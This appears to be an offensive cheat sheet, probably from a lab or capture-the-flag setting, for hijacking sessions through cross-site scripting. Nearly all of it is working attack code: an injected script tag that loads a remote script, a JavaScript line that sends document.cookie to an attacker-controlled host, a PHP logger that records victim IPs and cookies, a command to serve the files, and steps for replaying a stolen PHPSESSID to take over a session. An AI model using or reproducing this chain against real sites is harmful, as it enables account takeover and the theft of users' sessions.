# XSS-based Session Hijacking

## 1. Inject Payload

```html
<script src="http://10.10.14.63/script.js"></script>
```

## 2. script.js (Cookie Exfiltration)

```javascript
new Image().src='http://10.10.14.63/index.php?c='+document.cookie;
```

## 3. index.php (Cookie Logger)

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $cookie) {
        $cookie = urldecode($cookie);
        file_put_contents("cookies.txt", "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n", FILE_APPEND);
    }
}
?>
```

## 4. Host Server

```bash
php -S 0.0.0.0:80
```

Or:

```bash
php -S 0.0.0.0:8080
```

Adjust payload if using port 8080:

```html
<script src="http://10.10.14.63:8080/script.js"></script>
```

## 5. Cookie Capture

Captured cookies are written to:

```
cookies.txt
```

Example:

```
Victim IP: 10.10.10.10 | Cookie: PHPSESSID=abcdef123456
```

## 6. Replay Session Cookie (Firefox)

1. Open target site
2. Press F12 - Storage - Cookies
3. Add cookie:

   * Name: PHPSESSID
   * Value: abcdef123456
4. Refresh page to assume session
